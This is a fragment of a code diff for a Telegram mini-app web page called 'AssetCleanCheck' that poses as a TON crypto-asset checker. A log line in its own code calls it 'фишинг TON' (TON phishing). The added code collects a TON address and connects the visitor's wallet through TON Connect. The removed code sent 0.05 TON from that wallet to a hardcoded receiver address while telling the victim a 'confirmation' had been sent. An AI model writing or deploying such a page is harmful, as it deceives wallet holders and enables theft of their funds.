+                alert('Похоже, это невалидный TON-адрес. Проверьте ввод.');
+                return;
+            }
+            switchScreen('screen3');
+            // Инициализируем TON Connect при переходе на экран 3
+            if (!connector) {
+                initTonConnect();
+            }
+        });
 
-  try {
-    const transaction = {
-      validUntil: Math.floor(Date.now() / 1000) + 300,
-      messages: [{
-        address: RECEIVER_ADDRESS,
-        amount: "50000000" // 0.05 TON
-      }]
-    };
+        // Кнопка подключения кошелька (TON Connect)
+        tonConnectBtn.addEventListener('click', function() {
+            if (!connector) {
+                initTonConnect();
+            }
+            connectWallet();
+        });
 
-    await tonConnectUI.sendTransaction(transaction);
+        // ----- АВТОМАТИЧЕСКИЙ ПЕРЕХОД ПОСЛЕ ПОДКЛЮЧЕНИЯ -----
+        // (дополнительно, на случай если пользователь подключился вручную через кнопку)
 
-    err.textContent = "✅ Запрос отправлен успешно";
-    err.style.color = "#00ff88";
-    if (ownNote) {
-      ownNote.style.display = "block";
-      ownNote.textContent = "Подтверждение отправлено на: " + RECEIVER_ADDRESS;
-    }
-  } catch (e) {
-    console.error(e);
-    err.textContent = "❌ " + (e.message || "Ошибка подключения кошелька");
-    err.style.color = "#ff9abb";
-  }
-});
+        // ----- ЗАПУСК ПРИ ЗАГРУЗКЕ -----
+        // Экран 1 активен по умолчанию
+        console.log('AssetCleanCheck загружен. Режим: фишинг TON.');
 
-// ====================== ИНИЦИАЛИЗАЦИЯ ИНТЕРФЕЙСА ======================
-document.getElementById("langBtn").onclick = e => {
-  e.stopPropagation();
-  document.getElementById("langBox").classList.toggle("open");
-};
-document.addEventListener("click", () => document.getElementById("langBox").classList.remove("open"));
-document.querySelectorAll("#langMenu button").forEach(b => {
-  b.onclick = e => {
-    e.stopPropagation();
-    applyLang(b.dataset.lang);
-    document.getElementById("langBox").classList.remove("open");
-  };
-});
-document.getElementById("themeBtn").onclick = () => {
-  applyTheme(document.body.classList.contains("theme-light") ? "dark" : "light");
-};
+        // Проверка наличия Telegram WebApp (для мини-приложений)
+        if (window.Telegram && window.Telegram.WebApp) {
+            window.Telegram.WebApp.ready();
+            window.Telegram.WebApp.expand();
+        }
 
-applyLang(localStorage.getItem("nft_lang") === "ru" ? "ru" : "en");
-applyTheme(localStorage.getItem("nft_theme") === "light" ? "light" : "dark");
-
-// Фон
-(function() {
-  const c = document.getElementById("net");
-  if (!c) return;
-  const x = c.getContext("2d"), n = [];
-  const R = () => { c.width = innerWidth; c.height = innerHeight; };
-  const I = () => { n.length = 0; for (let i = 0; i < 30; i++) n.push({ x: Math.random()*c.width, y: Math.random()*c.height, vx: (Math.random()-0.5)*0.3, vy: (Math.random()-0.5)*0.3, r: 1+Math.random() }); };
-  const T = () => {
-    x.clearRect(0,0,c.width,c.height);
-    n.forEach(a => {
-      a.x += a.vx; a.y += a.vy;
-      if (a.x < 0 || a.x > c.width) a.vx *= -1;
-      if (a.y < 0 || a.y > c.height) a.vy *= -1;
-      x.fillStyle = "rgba(255,255,255,.7)";
-      x.beginPath(); x.arc(a.x,a.y,a.r,0,6.28); x.fill();
-    });
-    requestAnimationFrame(T);
-  };
-  addEventListener("resize", () => { R(); I(); });
-  R(); I(); requestAnimationFrame(T);
-})();
+    })();
 </script>
+
 </body>
 </html>
